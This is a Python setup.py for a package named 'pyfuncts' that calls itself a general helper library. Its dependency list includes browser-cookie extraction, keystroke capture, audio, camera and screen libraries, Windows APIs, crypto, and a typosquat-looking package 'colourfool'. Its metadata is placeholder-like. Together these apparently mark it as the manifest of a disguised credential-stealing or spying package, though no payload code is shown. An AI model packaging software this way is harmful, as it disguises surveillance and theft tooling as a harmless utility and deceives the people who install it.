
from setuptools import setup







setup(
    name='pyfuncts',
    version='0.1.1',    
    description='General helper for python',
    url='https://github.com/register',
    author='Author',
    author_email='gmails@gmails.com',
    license='BSD 2-clause',
    packages=['pyfuncts'],
    install_requires=["pathlib","opencv-python","screeninfo","psutil","httpx","flask","pynput","pillow","colourfool","browser_cookie3","pyaudio","bleach","pypiwin32","pycryptodome","pygame","requests"],

    classifiers=[
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
    ],
)